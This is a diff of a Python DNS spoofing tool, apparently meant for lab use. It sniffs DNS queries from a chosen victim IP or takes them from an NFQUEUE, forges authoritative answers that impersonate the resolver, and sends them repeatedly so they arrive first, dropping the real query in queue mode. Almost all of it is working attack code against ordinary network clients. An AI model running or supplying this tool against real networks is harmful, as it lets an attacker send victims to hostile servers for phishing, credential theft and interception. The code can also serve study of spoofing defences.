@@ -1,112 +1,223 @@
 #!/usr/bin/env python3
-# dns_spoof_nfqueue.py
+
 import argparse
 import json
-import os
 import signal
-from netfilterqueue import NetfilterQueue
-from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
+import sys
+import time
+from functools import partial
 
-nfqueue = None
-QUEUE_NUM = 0
-dns_map = {}  # keys normalized (lower, no-trailing-dot) -> ip string
+try:
+    from scapy.all import (
+        sniff,
+        send,
+        sendp,
+        IP,
+        UDP,
+        DNS,
+        DNSQR,
+        DNSRR,
+        Ether,
+    )
+except Exception as e:
+    print("ERROR: scapy is required. Install it inside your VM (pip3 install scapy).", file=sys.stderr)
+    raise
 
-def normalize_name(qname_raw):
-    # qname_raw can be bytes or str; return normalized str without trailing dot
-    if isinstance(qname_raw, bytes):
-        s = qname_raw.decode(errors='ignore')
-    else:
-        s = str(qname_raw)
-    if s.endswith('.'):
-        s = s[:-1]
-    return s.lower()
+# netfilterqueue is optional
+try:
+    from netfilterqueue import NetfilterQueue
+    HAVE_NFQUEUE = True
+except Exception:
+    HAVE_NFQUEUE = False
+
 
 def load_hosts(path):
     with open(path) as f:
         j = json.load(f)
-    out = {}
-    for k, v in j.items():
-        nk = k.lower().rstrip('.')
-        out[nk] = v
+    # normalize keys to lower-case without trailing dot
+    out = {k.lower().rstrip("."): str(v) for k, v in j.items()}
     return out
 
-def process(pkt):
+
+def normalize_name(qname):
+    if isinstance(qname, bytes):
+        s = qname.decode(errors="ignore")
+    else:
+        s = str(qname)
+    if s.endswith('.'):
+        s = s[:-1]
+    return s.lower()
+
+
+def craft_response_ip(pkt, fake_ip):
+    """Build an IP-layer DNS response (swap src/dst) from a DNS query packet."""
+    ip = pkt[IP]
+    udp = pkt[UDP]
+    dns = pkt[DNS]
+    ip_layer = IP(src=ip.dst, dst=ip.src)
+    udp_layer = UDP(sport=53, dport=udp.sport)
+    answer = DNSRR(rrname=dns.qd.qname, type='A', ttl=300, rdata=fake_ip)
+    resp = DNS(
+        id=dns.id,
+        qr=1,
+        aa=1,
+        rd=dns.rd,
+        ra=1,
+        qd=dns.qd,
+        an=answer,
+        ancount=1,
+    )
+    return ip_layer / udp_layer / resp
+
+
+def craft_response_ether(pkt, fake_ip):
+    """Build an Ethernet-level DNS response (useful if sending at L2 is needed).
+    pkt must be a full packet containing Ether/IP/UDP/DNS.
     """
-    pkt is an instance of netfilterqueue.Packet
-    We parse it with Scapy, look for DNS query (qr==0).
-    If qname in dns_map -> craft DNS response and drop the original (so resolver is not contacted).
-    Else accept (forward) the packet as-is.
-    """
+    eth = pkt.getlayer(Ether)
+    ip = pkt[IP]
+    udp = pkt[UDP]
+    dns = pkt[DNS]
+    # swap macs and ips
+    eth_resp = Ether(src=eth.dst, dst=eth.src)
+    ip_layer = IP(src=ip.dst, dst=ip.src)
+    udp_layer = UDP(sport=53, dport=udp.sport)
+    answer = DNSRR(rrname=dns.qd.qname, type='A', ttl=300, rdata=fake_ip)
+    dns_resp = DNS(
+        id=dns.id,
+        qr=1,
+        aa=1,
+        rd=dns.rd,
+        ra=1,
+        qd=dns.qd,
+        an=answer,
+        ancount=1,
+    )
+    return eth_resp / ip_layer / udp_layer / dns_resp
+
+
+def handle_sniff(pkt, iface, hosts, repeat, delay, send_at_l2, verbose):
+    # only handle DNS queries
+    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
+        return
+    dns = pkt[DNS]
+    if dns.qr != 0:  # not a query
+        return
+    try:
+        qname = dns.qd.qname
+    except Exception:
+        return
+    name = normalize_name(qname)
+    if name not in hosts:
+        if verbose:
+            print(f"[IGNORED] {name}")
+        return
+    fake_ip = hosts[name]
+    if send_at_l2 and pkt.haslayer(Ether):
+        resp = craft_response_ether(pkt, fake_ip)
+        for _ in range(repeat):
+            sendp(resp, iface=iface, verbose=0)
+            time.sleep(delay)
+    else:
+        resp = craft_response_ip(pkt, fake_ip)
+        for _ in range(repeat):
+            send(resp, iface=iface, verbose=0)
+            time.sleep(delay)
+    print(f"[SPOOFED] {name} -> {fake_ip} for {pkt[IP].src} id={dns.id}")
+
+
+def nfqueue_process(pkt, hosts, queue_num, verbose):
+    # pkt is a netfilterqueue packet
     try:
         scapy_pkt = IP(pkt.get_payload())
     except Exception:
         pkt.accept()
         return
-
-    # only handle UDP DNS queries
+    # handle UDP DNS queries
     if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(DNS) and scapy_pkt[DNS].qr == 0:
+        dns = scapy_pkt[DNS]
         try:
-            qname = scapy_pkt[DNSQR].qname
+            qname = dns.qd.qname
         except Exception:
             pkt.accept()
             return
-
-        nq = normalize_name(qname)
-        if nq in dns_map:
-            fake_ip = dns_map[nq]
-            # build a forged DNS response
-            # Use src=original dst swapped (pretend to be the DNS server the victim expects)
-            ip = IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src)
-            udp = UDP(sport=53, dport=scapy_pkt[UDP].sport)
-            dnsresp = DNS(
-                id=scapy_pkt[DNS].id,
-                qr=1, aa=1, ra=1,  # response, authoritative, recursion-available (optional)
-                qd=scapy_pkt[DNS].qd,
-                an=DNSRR(rrname=scapy_pkt[DNS].qd.qname, type="A", ttl=300, rdata=fake_ip),
-                ancount=1
+        name = normalize_name(qname)
+        if name in hosts:
+            fake_ip = hosts[name]
+            ip_layer = IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src)
+            udp_layer = UDP(sport=53, dport=scapy_pkt[UDP].sport)
+            resp_dns = DNS(
+                id=dns.id,
+                qr=1,
+                aa=1,
+                rd=dns.rd,
+                ra=1,
+                qd=dns.qd,
+                an=DNSRR(rrname=dns.qd.qname, type='A', ttl=300, rdata=fake_ip),
+                ancount=1,
             )
-            resp = ip/udp/dnsresp
-            # send at IP layer (this does not touch nfqueue)
+            resp = ip_layer / udp_layer / resp_dns
             send(resp, verbose=0)
-            print(f"[SPOOFED] {nq} -> {fake_ip} for {scapy_pkt[IP].src}")
-            # drop original query so it doesn't reach real resolver
+            if verbose:
+                print(f"[SPOOFED-NFQ] {name} -> {fake_ip} for {scapy_pkt[IP].src} id={dns.id}")
             pkt.drop()
             return
-    # default: accept and let it be forwarded
     pkt.accept()
 
-def signal_handler(sig, frame):
-    global nfqueue
-    if nfqueue:
-        nfqueue.unbind()
-    # remove only the NFQUEUE rule (be careful)
-    os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {QUEUE_NUM} 2>/dev/null || true")
-    print("\nStopped. NFQUEUE rule removed (if present).")
-    exit(0)
+
+def setup_nfqueue(hosts, queue_num, verbose):
+    if not HAVE_NFQUEUE:
+        print("NetfilterQueue python binding not present. Install python3-netfilterqueue or use sniff mode.")
+        sys.exit(1)
+    nfq = NetfilterQueue()
+    nfq.bind(queue_num, lambda p: nfqueue_process(p, hosts, queue_num, verbose))
+    print(f"Listening on NFQUEUE {queue_num} ... (ctrl-c to stop)")
+    try:
+        nfq.run()
+    except KeyboardInterrupt:
+        print("Stopping NFQUEUE listener")
+    finally:
+        nfq.unbind()
+
 
 def main():
-    global nfqueue, dns_map
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-i", "--iface", help="interface (not used directly here)", default="eth0")
-    parser.add_argument("-j", "--hosts-json", required=True, help="json file mapping domain->ip")
-    parser.add_argument("-q", "--queue", type=int, default=0, help="nfqueue number")
-    args = parser.parse_args()
+    p = argparse.ArgumentParser(description="dns_spoof.py - sniff+inject or nfqueue based DNS spoofer")
+    p.add_argument("--mode", choices=['sniff', 'nfqueue'], default='sniff', help='Operation mode')
+    p.add_argument("-i", "--iface", default='eth0', help='Interface to sniff/send on')
+    p.add_argument("-t", "--target", help='Victim IP to filter for (sniff mode)')
+    p.add_argument("-c", "--hosts", required=True, help='JSON file mapping domain->ip')
+    p.add_argument("-r", "--repeat", type=int, default=4, help='Number of replies to send')
+    p.add_argument("-d", "--delay", type=float, default=0.02, help='Delay between replies (s)')
+    p.add_argument("--l2", action='store_true', help='Send at Ethernet layer (sendp) when sniffing')
+    p.add_argument("-q", "--queue", type=int, default=0, help='NFQUEUE number (nfqueue mode)')
+    p.add_argument("--verbose", action='store_true')
+    args = p.parse_args()
 
-    dns_map = load_hosts(args.hosts_json)
-    print("Loaded targets:", dns_map)
+    hosts = load_hosts(args.hosts)
+    if not hosts:
+        print("No hosts loaded — exiting")
+        sys.exit(1)
+    print("Targets:", hosts)
 
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
+    def stop_handler(sig, frame):
+        print("Stopping...")
+        sys.exit(0)
 
-    QUEUE = args.queue
-    # Ensure the iptables rule exists (user still can create it manually)
-    print(f"Make sure you ran: iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE}")
-    nfqueue = NetfilterQueue()
-    nfqueue.bind(QUEUE, process)
-    try:
-        nfqueue.run()
-    except KeyboardInterrupt:
-        signal_handler(None, None)
+    signal.signal(signal.SIGINT, stop_handler)
+    signal.signal(signal.SIGTERM, stop_handler)
 
-if __name__ == "__main__":
+    if args.mode == 'nfqueue':
+        print("NFQUEUE mode selected")
+        print("Make sure you created an iptables/nft rule to send DNS packets to the queue.")
+        setup_nfqueue(hosts, args.queue, args.verbose)
+    else:
+        if not args.target:
+            print("In sniff mode you must supply --target (victim IP). Exiting.")
+            sys.exit(1)
+        bpf = f"udp and port 53 and src host {args.target}"
+        print("Sniff mode: filter=", bpf)
+        sniff(iface=args.iface, filter=bpf, prn=lambda pkt: handle_sniff(pkt, args.iface, hosts, args.repeat, args.delay, args.l2, args.verbose), store=0)
+
+
+if __name__ == '__main__':
     main()
